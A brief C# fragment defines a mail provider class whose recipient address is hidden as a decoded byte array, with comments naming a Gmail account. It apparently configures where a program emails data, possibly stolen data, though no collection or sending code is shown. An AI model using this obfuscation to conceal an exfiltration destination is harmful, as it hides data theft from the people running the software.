...
{
    internal sealed class MaintainMailProvider : MailProvider
    {
        ...
        public override string ToAddress
        {
            get
            {
                // pass: Create your Google Account
                // user: kitty0error@gmail.com
                byte[] from = new byte[] { 107, 105, 116, 116, 121, 48, 101, 114, 114, 111, 114, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109 };
                return GetStringFromBytes(from);
            }
        }
    }
